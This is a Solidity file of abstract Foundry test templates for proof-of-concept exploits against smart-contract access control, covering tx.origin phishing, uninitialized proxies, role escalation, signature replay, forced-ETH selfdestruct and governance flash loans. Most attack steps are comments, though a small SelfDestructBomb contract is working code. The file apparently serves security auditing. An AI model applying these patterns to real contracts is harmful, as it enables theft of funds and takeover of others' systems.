// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../foundry/base_test.sol";

/**
 * @title AccessControlPoC
 * @notice Template for access control vulnerability PoCs
 *
 * Common patterns:
 * 1. Missing access control on sensitive functions
 * 2. tx.origin authentication bypass
 * 3. Unprotected initializer
 * 4. Privilege escalation via role manipulation
 */
abstract contract AccessControlPoC is BaseExploitTest {
    function test_missingAccessControl() public asAttacker {
        console.log("=== Testing Missing Access Control ===");

        // Step 1: Identify admin-only function without modifier
        // Step 2: Call it directly as attacker
        // Step 3: Verify unauthorized action succeeded

        _callUnprotectedFunction();
    }

    function _callUnprotectedFunction() internal virtual {
        // Example: target.setOwner(ATTACKER);
        // Example: target.withdrawAll(ATTACKER);
        // Example: target.pause();
    }
}

/**
 * @title TxOriginBypassPoC
 * @notice Exploit tx.origin authentication via phishing
 */
abstract contract TxOriginBypassPoC is BaseExploitTest {
    // Phishing contract deployed by attacker
    address internal phishingContract;

    function test_txOriginBypass() public {
        console.log("=== Testing tx.origin Bypass ===");

        // Step 1: Deploy phishing contract
        phishingContract = address(new PhishingContract());

        // Step 2: Victim interacts with phishing contract
        // (simulated by having victim call our contract)
        vm.prank(VICTIM);
        IPhishing(phishingContract).claimReward();

        // Step 3: During victim's call, phishing contract calls target
        // tx.origin = VICTIM, msg.sender = phishingContract
        // If target checks tx.origin == owner, it passes
    }
}

interface IPhishing {
    function claimReward() external;
}

contract PhishingContract {
    // Target using tx.origin for auth
    address immutable target;
    address immutable attacker;

    constructor() {
        attacker = msg.sender;
        // target = address(vulnerableContract);
    }

    // Looks legitimate but calls vulnerable contract
    function claimReward() external {
        // When victim calls this, tx.origin = victim
        // We can call functions that check tx.origin
        // IVulnerable(target).transferOwnership(attacker);
    }
}

/**
 * @title UninitializedProxyPoC
 * @notice Exploit unprotected initializer in proxy pattern
 */
abstract contract UninitializedProxyPoC is BaseExploitTest {
    function test_uninitializedProxy() public asAttacker {
        console.log("=== Testing Uninitialized Proxy ===");

        // Step 1: Find proxy that was deployed but not initialized
        // Step 2: Call initialize() to become owner
        _initializeAsAttacker();

        // Step 3: Use owner privileges to drain
        _drainAsOwner();
    }

    function _initializeAsAttacker() internal virtual {
        // Example: proxy.initialize(ATTACKER);
        // Example: implementation.initialize(ATTACKER);
    }

    function _drainAsOwner() internal virtual {
        // Example: proxy.withdrawAll(ATTACKER);
        // Example: proxy.upgradeTo(maliciousImplementation);
    }
}

/**
 * @title PrivilegeEscalationPoC
 * @notice Exploit role management flaws
 */
abstract contract PrivilegeEscalationPoC is BaseExploitTest {
    function test_privilegeEscalation() public asAttacker {
        console.log("=== Testing Privilege Escalation ===");

        // Step 1: Identify role management functions
        // Step 2: Find path to grant ourselves higher roles
        // Step 3: Use elevated privileges

        _escalatePrivileges();
        _useElevatedPrivileges();
    }

    function _escalatePrivileges() internal virtual {
        // Example: Anyone can grant roles
        // target.grantRole(ADMIN_ROLE, ATTACKER);

        // Example: Role inheritance flaw
        // Grant ourselves a role that implicitly has admin rights
    }

    function _useElevatedPrivileges() internal virtual {
        // Use admin functions
    }
}

/**
 * @title SignatureReplayPoC
 * @notice Exploit signature-based access control flaws
 */
abstract contract SignatureReplayPoC is BaseExploitTest {
    function test_signatureReplay() public asAttacker {
        console.log("=== Testing Signature Replay ===");

        // Step 1: Obtain valid signature (from previous tx, different chain, etc.)
        (bytes memory signature, bytes32 message) = _obtainValidSignature();

        // Step 2: Replay on same/different chain
        _replaySignature(signature, message);
    }

    function _obtainValidSignature() internal virtual returns (bytes memory, bytes32) {
        // Get signature from mempool, past tx, or cross-chain
        return ("", bytes32(0));
    }

    function _replaySignature(bytes memory signature, bytes32 message) internal virtual {
        // Replay attack
        // Issues:
        // - No nonce tracking
        // - No chain ID in message
        // - No deadline
    }
}

/**
 * @title SelfDestructPoC
 * @notice Exploit selfdestruct to bypass access control
 */
abstract contract SelfDestructPoC is BaseExploitTest {
    function test_selfDestructBypass() public asAttacker {
        console.log("=== Testing Selfdestruct Bypass ===");

        // Deploy contract that will selfdestruct and send ETH to target
        // This bypasses receive()/fallback() which might have access control

        address target = address(0); // vulnerable contract

        // Deploy bomb contract
        SelfDestructBomb bomb = new SelfDestructBomb{value: 1 ether}(target);

        // Detonate - sends ETH without calling any function
        bomb.explode();

        // Target now has unexpected ETH balance
        // This can break:
        // - Balance checks
        // - Invariants based on tracked deposits
        // - Share calculations in vaults
    }
}

contract SelfDestructBomb {
    address payable immutable target;

    constructor(address _target) payable {
        target = payable(_target);
    }

    function explode() external {
        selfdestruct(target);
    }
}

/**
 * @title GovernanceAttackPoC
 * @notice Exploit governance flash loan attacks
 */
abstract contract GovernanceAttackPoC is BaseExploitTest {
    function test_governanceFlashLoan() public asAttacker {
        console.log("=== Testing Governance Flash Loan Attack ===");

        // Step 1: Flash loan governance tokens
        // Step 2: Vote for malicious proposal
        // Step 3: If threshold met, proposal executes immediately
        // Step 4: Repay flash loan

        // Attack succeeds if:
        // - Voting power is current balance (not snapshot)
        // - Proposal can execute without timelock
        // - Threshold can be met with flash loaned tokens
    }
}
